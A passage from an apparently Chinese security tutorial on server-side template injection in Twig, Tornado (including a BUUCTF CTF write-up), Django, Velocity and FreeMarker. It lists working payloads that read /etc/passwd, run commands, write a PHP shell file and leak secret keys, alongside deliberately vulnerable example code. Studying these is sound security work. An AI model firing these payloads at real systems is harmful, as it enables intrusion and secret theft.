<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623182617009.png" alt="image-20230623182617009"></p>
<p>以上就是php twig模板注入，由于以上使用的twig为2.x版本，现在官方已经更新到3.x版本，根据官方文档新增了 filter 和 map 等内容，补充一些新版本的payload：</p>
<pre><code class="hljs php">{{<span class="hljs-string">'/etc/passwd'</span>|<span class="hljs-title function_ invoke__">file_excerpt</span>(<span class="hljs-number">1</span>,<span class="hljs-number">30</span>)}}

{{app.request.files.<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-number">1</span>).<span class="hljs-title function_ invoke__">__construct</span>(<span class="hljs-string">'/etc/passwd'</span>,<span class="hljs-string">''</span>)}}

{{app.request.files.<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-number">1</span>).openFile.<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-number">99</span>)}}

{{_self.env.<span class="hljs-title function_ invoke__">registerUndefinedFilterCallback</span>(<span class="hljs-string">"exec"</span>)}}{{_self.env.<span class="hljs-title function_ invoke__">getFilter</span>(<span class="hljs-string">"whoami"</span>)}}

{{_self.env.<span class="hljs-title function_ invoke__">enableDebug</span>()}}{{_self.env.<span class="hljs-title function_ invoke__">isDebug</span>()}}

{{[<span class="hljs-string">"id"</span>]|<span class="hljs-title function_ invoke__">map</span>(<span class="hljs-string">"system"</span>)|<span class="hljs-title function_ invoke__">join</span>(<span class="hljs-string">","</span>)

{{{<span class="hljs-string">"&lt;?php phpinfo();"</span>:<span class="hljs-string">"/var/www/html/shell.php"</span>}|<span class="hljs-title function_ invoke__">map</span>(<span class="hljs-string">"file_put_contents"</span>)}}

{{[<span class="hljs-string">"id"</span>,<span class="hljs-number">0</span>]|<span class="hljs-title function_ invoke__">sort</span>(<span class="hljs-string">"system"</span>)|<span class="hljs-title function_ invoke__">join</span>(<span class="hljs-string">","</span>)}}

{{[<span class="hljs-string">"id"</span>]|<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-string">"system"</span>)|<span class="hljs-title function_ invoke__">join</span>(<span class="hljs-string">","</span>)}}

{{[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]|<span class="hljs-title function_ invoke__">reduce</span>(<span class="hljs-string">"system"</span>,<span class="hljs-string">"id"</span>)|<span class="hljs-title function_ invoke__">join</span>(<span class="hljs-string">","</span>)}}

{{[<span class="hljs-string">'cat /etc/passwd'</span>]|<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-string">'system'</span>)}}</code></pre>
<p>具体payload分析详见：《<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7518#toc-5">TWIG 全版本通用 SSTI payloads</a>》</p>
<p>利用payload为： <a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html">msf反弹shell</a></p>
<pre><code class="hljs plaintext">{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}			//id是执行linux命令的地方，这个payload好像只能回显最前面的一个</code></pre>
<p>补充：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7518#toc-5">TWIG 全版本通用 SSTI payloads</a></p>
<h2 id="八-python-tornado模板">八、Python-tornado模板</h2>
<pre><code class="hljs plaintext">tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过{{}}进行传递变量和执行简单的表达式。</code></pre>
<p>以下代码将定义一个TEMPLATE变量作为一个模板文件，然后使用传入的name替换模板中的"FOO"，在进行加载模板并输出，且未对name值进行安全检查输入情况。</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> tornado.template
<span class="hljs-keyword">import</span> tornado.ioloop
<span class="hljs-keyword">import</span> tornado.web
TEMPLATE = <span class="hljs-string">'''</span>
<span class="hljs-string">&lt;html&gt;</span>
<span class="hljs-string"> &lt;head&gt;&lt;title&gt; Hello {{ name }} &lt;/title&gt;&lt;/head&gt;</span>
<span class="hljs-string"> &lt;body&gt; Hello max &lt;/body&gt;</span>
<span class="hljs-string">&lt;/html&gt;</span>
<span class="hljs-string">'''</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MainHandler</span>(tornado.web.RequestHandler):

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self</span>):
        name = self.get_argument(<span class="hljs-string">'name'</span>, <span class="hljs-string">''</span>)
        template_data = TEMPLATE.replace(<span class="hljs-string">"FOO"</span>,name)
        t = tornado.template.Template(template_data)
        self.write(t.generate(name=name))

application = tornado.web.Application([(<span class="hljs-string">r"/"</span>, MainHandler),], debug=<span class="hljs-literal">True</span>, static_path=<span class="hljs-literal">None</span>, template_path=<span class="hljs-literal">None</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    application.listen(<span class="hljs-number">8000</span>)
    tornado.ioloop.IOLoop.instance().start()</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623191121840.png" alt="image-20230623191121840"></p>
<p>这里拿一道BUUCTF的题来演示一下tornado render模板注入：</p>
<p><strong>[护网杯 2018]easy_tornado</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623191301525.png" alt="image-20230623191301525"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623191355233.png" alt="image-20230623191355233"></p>
<p>根据上面的信息，我们知道flag在/fllllllllllllag文件中</p>
<p>render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页render配合Tornado使用</p>
<p>最后就是这段代码md5(cookie_secret+md5(filename))，再来分析我们访问的链接：</p>
<pre><code class="hljs plaintext">http://313ac7f3-c560-4d46-b1ff-daa279729980.node4.buuoj.cn:81/file?filename=/flag.txt&amp;filehash=27eda9bc17cbe1b856e6d541e10c16ea</code></pre>
<p>推测md5加密过后的值就是url中filehash对应的值，想获得flag只要我们在filename中传入/fllllllllllllag文件和filehash，所以关键是获取cookie_secret</p>
<pre><code class="hljs plaintext">在tornado模板中，存在一些可以访问的快速对象，比如 {{escape(handler.settings["cookie"])}}，这个其实就是handler.settings对象，里面存储着一些环境变量。</code></pre>
<p>具体分析请参照《<a target="_blank" rel="noopener" href="https://www.cnblogs.com/cimuhuashuimu/p/11544455.html">python SSTI tornado render模板注入</a>》。</p>
<p>观察错误页面，发现页面返回的由msg的值决定</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623191732092.png" alt="image-20230623191732092"></p>
<p>修改msg的值注入，获得环境变量</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623191804739.png" alt="image-20230623191804739"></p>
<pre><code class="hljs plaintext">cookie_secret: faaff564-f1dd-429d-90b3-130ab49962ea</code></pre>
<p>得到cookie_secret的值，根据上面的md5进行算法重构，就可以得到filehash，这里给出py3的转换脚本</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib
<span class="hljs-built_in">hash</span> = hashlib.md5()

filename=<span class="hljs-string">'/fllllllllllllag'</span>
cookie_secret=<span class="hljs-string">"faaff564-f1dd-429d-90b3-130ab49962ea"</span>
<span class="hljs-built_in">hash</span>.update(filename.encode(<span class="hljs-string">'utf-8'</span>))
s1=<span class="hljs-built_in">hash</span>.hexdigest()
<span class="hljs-built_in">hash</span> = hashlib.md5()
<span class="hljs-built_in">hash</span>.update((cookie_secret+s1).encode(<span class="hljs-string">'utf-8'</span>))
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hash</span>.hexdigest())</code></pre>
<p>得到filehash=874955327dac355296226eb28f1b02b8，得到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623192113538.png" alt="image-20230623192113538"></p>
<h2 id="九-python-django模板">九、Python-Django模板</h2>
<p>先看存在漏洞的代码：</p>
<pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">view</span>(<span class="hljs-params">request, *args, **kwargs</span>):
    template = <span class="hljs-string">'Hello {user}, This is your email: '</span> + request.GET.get(<span class="hljs-string">'email'</span>)
    <span class="hljs-keyword">return</span> HttpResponse(template.<span class="hljs-built_in">format</span>(user=request.user))</code></pre>
<p>很明显 email 就是注入点，但是条件被限制的很死，很难执行命令，现在拿到的只有有一个和user有关的变量request.user ，这个时候我们就应该在没有应用源码的情况下去寻找框架本身的属性，看这个空框架有什么属性和类之间的引用。</p>
<p>后来发现Django自带的应用 “admin”（也就是Django自带的后台）的models.py中导入了当前网站的配置文件：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623192434487.png" alt="image-20230623192434487"></p>
<p>所以可以通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。</p>
<p>payload如下：</p>
<pre><code class="hljs python">http://localhost:<span class="hljs-number">8000</span>/?email={user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}

http://localhost:<span class="hljs-number">8000</span>/?email={user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}</code></pre>
<h2 id="十-java-velocity模板">十、Java-velocity模板</h2>
<p>（以下板块参照自《<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8135#toc-2">CVE-2019-3396 Confluence Velocity SSTI漏洞浅析</a>》）</p>
<p>Apache Velocity是一个基于Java的模板引擎，它提供了一个模板语言去引用由Java代码定义的对象。Velocity是Apache基金会旗下的一个开源软件项目，旨在确保Web应用程序在表示层和业务逻辑层之间的隔离（即MVC设计模式）。</p>
<h3 id="1-基本语法">1. 基本语法</h3>
<p><strong>语句标识符</strong></p>
<p>#用来标识Velocity的脚本语句，包括#set、#if 、#else、#end、#foreach、#end、#include、#parse、#macro等语句。</p>
<p><strong>变量</strong></p>
<p>$用来标识一个变量，比如模板文件中为Hello $a，可以获取通过上下文传递的$a</p>
<p><strong>声明</strong></p>
<p>set用于声明Velocity脚本变量，变量可以在脚本中声明</p>
<pre><code class="hljs java">#set($a =<span class="hljs-string">"velocity"</span>)
#set($b=<span class="hljs-number">1</span>)
#set($arrayName=[<span class="hljs-string">"1"</span>,<span class="hljs-string">"2"</span>])</code></pre>
<p><strong>注释</strong></p>
<p>单行注释为##，多行注释为成对出现的#* … *#</p>
<p><strong>条件语句</strong></p>
<p>以if/else为例：</p>
<pre><code class="hljs java">#<span class="hljs-keyword">if</span>($foo&lt;<span class="hljs-number">10</span>)
    &lt;strong&gt;<span class="hljs-number">1</span>&lt;/strong&gt;
#elseif($foo==<span class="hljs-number">10</span>)
    &lt;strong&gt;<span class="hljs-number">2</span>&lt;/strong&gt;
#elseif($bar==<span class="hljs-number">6</span>)
    &lt;strong&gt;<span class="hljs-number">3</span>&lt;/strong&gt;
#<span class="hljs-keyword">else</span>
    &lt;strong&gt;<span class="hljs-number">4</span>&lt;/strong&gt;
#end</code></pre>
<p><strong>转义字符</strong></p>
<p>如果$a已经被定义，但是又需要原样输出$a，可以试用\转义作为关键的$</p>
<p><strong>基础使用</strong></p>
<p>使用Velocity主要流程为：</p>
<ul>
<li>初始化Velocity模板引擎，包括模板路径、加载类型等</li>
<li>创建用于存储预传递到模板文件的数据的上下文</li>
<li>选择具体的模板文件，传递数据完成渲染</li>
</ul>
<p>VelocityTest.java</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> Velocity;

<span class="hljs-keyword">import</span> org.apache.velocity.Template;
<span class="hljs-keyword">import</span> org.apache.velocity.VelocityContext;
<span class="hljs-keyword">import</span> org.apache.velocity.app.VelocityEngine;

<span class="hljs-keyword">import</span> java.io.StringWriter;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VelocityTest</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {

        <span class="hljs-type">VelocityEngine</span> <span class="hljs-variable">velocityEngine</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityEngine</span>();
        velocityEngine.setProperty(VelocityEngine.RESOURCE_LOADER, <span class="hljs-string">"file"</span>);
        velocityEngine.setProperty(VelocityEngine.FILE_RESOURCE_LOADER_PATH, <span class="hljs-string">"src/main/resources"</span>);
        velocityEngine.init();


        <span class="hljs-type">VelocityContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityContext</span>();
        context.put(<span class="hljs-string">"name"</span>, <span class="hljs-string">"Rai4over"</span>);
        context.put(<span class="hljs-string">"project"</span>, <span class="hljs-string">"Velocity"</span>);


        <span class="hljs-type">Template</span> <span class="hljs-variable">template</span> <span class="hljs-operator">=</span> velocityEngine.getTemplate(<span class="hljs-string">"test.vm"</span>);
        <span class="hljs-type">StringWriter</span> <span class="hljs-variable">sw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>();
        template.merge(context, sw);
        System.out.println(<span class="hljs-string">"final output:"</span> + sw);
    }
}</code></pre>
<p>模板文件：src/main/resources/test.vm</p>
<pre><code class="hljs plaintext">Hello World! The first velocity demo.
Name is $name.
Project is $project</code></pre>
<p>输出结果：</p>
<pre><code class="hljs plaintext">final output:
Hello World! The first velocity demo.
Name is Victor Zhang.
Project is Velocity
java.lang.UNIXProcess@12f40c25</code></pre>
<p>通过 VelocityEngine 创建模板引擎，接着 velocityEngine.setProperty 设置模板路径 src/main/resources、加载器类型为file，最后通过 velocityEngine.init() 完成引擎初始化。</p>
<p>通过 VelocityContext() 创建上下文变量，通过put添加模板中使用的变量到上下文。</p>
<p>通过 getTemplate 选择路径中具体的模板文件test.vm，创建 StringWriter 对象存储渲染结果，然后将上下文变量传入 template.merge 进行渲染。</p>
<p>比如：</p>
<p>这里使用java-sec-code里面的SSTI代码：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623193412181.png" alt="image-20230623193412181"></p>
<p>poc：</p>
<pre><code class="hljs scss">http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8080</span>/ssti/velocity?template=%<span class="hljs-number">23s</span><span class="hljs-built_in">et</span>(%<span class="hljs-number">24</span>e=%<span class="hljs-number">22</span>e%<span class="hljs-number">22</span>);%<span class="hljs-number">24</span>e<span class="hljs-selector-class">.getClass</span>()<span class="hljs-selector-class">.forName</span>(%<span class="hljs-number">22</span>java.lang.Runtime%<span class="hljs-number">22</span>)<span class="hljs-selector-class">.getMethod</span>(%<span class="hljs-number">22</span>getRuntime%<span class="hljs-number">22</span>,null)<span class="hljs-selector-class">.invoke</span>(null,null)<span class="hljs-selector-class">.exec</span>(%<span class="hljs-number">22</span>calc%<span class="hljs-number">22</span>)<span class="hljs-variable">$class</span><span class="hljs-selector-class">.inspect</span>("java.lang.Runtime")<span class="hljs-selector-class">.type</span><span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>("sleep <span class="hljs-number">5</span>")<span class="hljs-selector-class">.waitFor</span>() <span class="hljs-comment">//延迟了5秒</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623193517184.png" alt="image-20230623193517184"></p>
<p>参照《<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7466">白头搔更短，SSTI惹人心！</a>》简单进行调试</p>
<p>在最初的Controller层下断点，来追踪poc的解析过程：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623193531234.png" alt="image-20230623193531234"></p>
<p>（template -&gt; instring）进入 Velocity.evaluate 方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623193638336.png" alt="image-20230623193638336"></p>
<p>（instring -&gt; reader）继续跟进 evaluate 方法，RuntimeInstance类中封装了evaluate方法，instring被强制转化(Reader)类型。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623193803831.png" alt="image-20230623193803831"></p>
<p>跟进 StringReader 方法查看详情：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623193902862.png" alt="image-20230623193902862"></p>
<p>（reader -&gt; nodeTree）继续跟进 this.evaluate() 方法</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623194043449.png" alt="image-20230623194043449"></p>
<p>（nodeTree -&gt; writer）继续跟进render方法</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623194149726.png" alt="image-20230623194149726"></p>
<p>emmm…继续跟进render</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623194211611.png" alt="image-20230623194211611"></p>
<p>继续看render方法</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623194233181.png" alt="image-20230623194233181"></p>
<p>跟进execute方法</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623194305241.png" alt="image-20230623194305241"></p>
<p>可以看到这是最后一步了，调试结束就可以看到poc已经成功被执行，看一下上图中的for循环的代码，大概意思是当遍历的节点时候，这时候就会一步步的保存我们的payload最终导致RCE</p>
<p><strong>Confluence 未授权RCE分析（CVE-2019-3396）</strong></p>
<p>根据官方文档的描述，可以看到这是由 widget Connector 这个插件造成的SSTI，利用SSTI而造成的RCE。在经过diff后，可以确定触发漏洞的关键点在于对post包中的_template字段</p>
<p>具体漏洞代码调试可以参考：《<a target="_blank" rel="noopener" href="https://caiqiqi.github.io/2019/11/03/Confluence%E6%9C%AA%E6%8E%88%E6%9D%83%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2019-3396/">Confluence未授权模板注入/代码执行(CVE-2019-3396)</a>》</p>
<p>《[Confluence 未授权RCE分析（CVE-2019-3396）](<a target="_blank" rel="noopener" href="https://lucifaer.com/2019/04/16/Confluence">https://lucifaer.com/2019/04/16/Confluence</a> 未授权RCE分析（CVE-2019-3396）/#0x01-漏洞概述)》</p>
<h2 id="十一-java-freemarker">十一、Java-FreeMarker</h2>
<p>FreeMarker 是一款模板引擎：即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623194739724.png" alt="image-20230623194739724"></p>
<p><strong>FreeMarker模板代码</strong>：</p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Welcome!<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>　&lt;#–这是注释–&gt;
  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Welcome ${user}!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Our latest product:
  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"${latestProduct.url}"</span>&gt;</span>${latestProduct.name}<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>!
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
<p>模板文件存放在Web服务器上，就像通常存放静态HTML页面那样。当有人来访问这个页面， FreeMarker将会介入执行，然后动态转换模板，用最新的数据内容替换模板中 ${…} 的部分， 之后将结果发送到访问者的Web浏览器中。</p>
<p>这个模板主要用于 java ，用户可以通过实现 TemplateModel 来用 new 创建任意 Java 对象</p>
<p>具体的高级内置函数定义参考《<a target="_blank" rel="noopener" href="https://freemarker.apache.org/docs/ref_builtins_expert.html">Seldom used and expert built-ins</a>》</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623194939538.png" alt="image-20230623194939538"></p>
<p>主要的用法如下：</p>
<pre><code class="hljs plaintext">&lt;＃ - 创建一个用户定义的指令，调用类的参数构造函数 - &gt;
&lt;#assign word_wrapp ="com.acmee.freemarker.WordWrapperDirective"?new（）&gt;
&lt;＃ - 创建一个用户定义的指令，用一个数字参数调用构造函数 - &gt;
&lt;#assign word_wrapp_narrow ="com.acmee.freemarker.WordWrapperDirective"?new（40）&gt;</code></pre>
<p>调用了构造函数创建了一个对象，那么这个 payload 中就是调用的 freemarker 的内置执行命令的对象 Execute</p>
<p>freemarker.template.utility 里面有个Execute类，这个类会执行它的参数，因此我们可以利用new函数新建一个Execute类，传输我们要执行的命令作为参数，从而构造远程命令执行漏洞。构造payload：</p>
<pre><code class="hljs plaintext">&lt;#assign value="freemarker.template.utility.Execute"?new()&gt;${value("calc.exe")}</code></pre>
<p>freemarker.template.utility 里面的JythonRuntime，可以通过自定义标签的方式，执行Python命令，从而构造远程命令执行漏洞。</p>
<pre><code class="hljs plaintext">&lt;#assign value="freemarker.template.utility.JythonRuntime"?new()&gt;&lt;@value&gt;import os;os.system("calc.exe")&lt;/@value&gt;</code></pre>
<p>这里使用测试代码来大概演示一下：<a target="_blank" rel="noopener" href="https://github.com/hellokoding/springboot-freemarker">https://github.com/hellokoding/springboot-freemarker</a></p>
<p>代码演示说明：<a target="_blank" rel="noopener" href="https://hellokoding.com/spring-boot/freemarker/">https://hellokoding.com/spring-boot/freemarker/</a></p>
<p><strong>前端代码　　——&gt;　　hello.ftl</strong></p>
<pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Hello ${name}!<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/css/main.css"</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"hello-title"</span>&gt;</span>Hello ${name}!<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/js/main.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
<p><strong>后端代码　　——&gt;　　HelloController.java：</strong></p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.backendvulnerabilities.ssti;

<span class="hljs-keyword">import</span> freemarker.cache.MultiTemplateLoader;
<span class="hljs-keyword">import</span> freemarker.cache.StringTemplateLoader;
<span class="hljs-keyword">import</span> freemarker.cache.TemplateLoader;
<span class="hljs-keyword">import</span> freemarker.template.Configuration;
<span class="hljs-keyword">import</span> freemarker.template.Template;
<span class="hljs-keyword">import</span> freemarker.template.TemplateException;
<span class="hljs-keyword">import</span> freemarker.template.utility.DateUtil;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;
<span class="hljs-keyword">import</span> org.springframework.ui.Model;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;

<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;
<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.io.StringWriter;
<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-meta">@Controller</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span>  Configuration con;

    <span class="hljs-meta">@GetMapping("/")</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"index"</span>;
    }

    <span class="hljs-meta">@RequestMapping(value = "/hello")</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Map&lt;String,Object&gt; body, Model model)</span> {
        model.addAttribute(<span class="hljs-string">"name"</span>, body.get(<span class="hljs-string">"name"</span>));
        <span class="hljs-keyword">return</span> <span class="hljs-string">"hello"</span>;
    }

    <span class="hljs-meta">@RequestMapping(value = "/freemarker")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">freemarker</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam("username")</span> String username, HttpServletRequest httpserver,HttpServletResponse response)</span> {
        <span class="hljs-keyword">try</span>{
            <span class="hljs-type">String</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> <span class="hljs-string">"1ooooooooooooooooooo~"</span>;
            <span class="hljs-type">String</span> <span class="hljs-variable">templateContent</span> <span class="hljs-operator">=</span> <span class="hljs-string">"&lt;html&gt;&lt;body&gt;Hello "</span> + username + <span class="hljs-string">" ${data}&lt;/body&gt;&lt;/html&gt;"</span>;
            <span class="hljs-type">String</span> <span class="hljs-variable">html</span> <span class="hljs-operator">=</span> createHtmlFromString(templateContent,data);
            response.getWriter().println(html);

            }<span class="hljs-keyword">catch</span> (Exception e){
                e.printStackTrace();
            }
    }

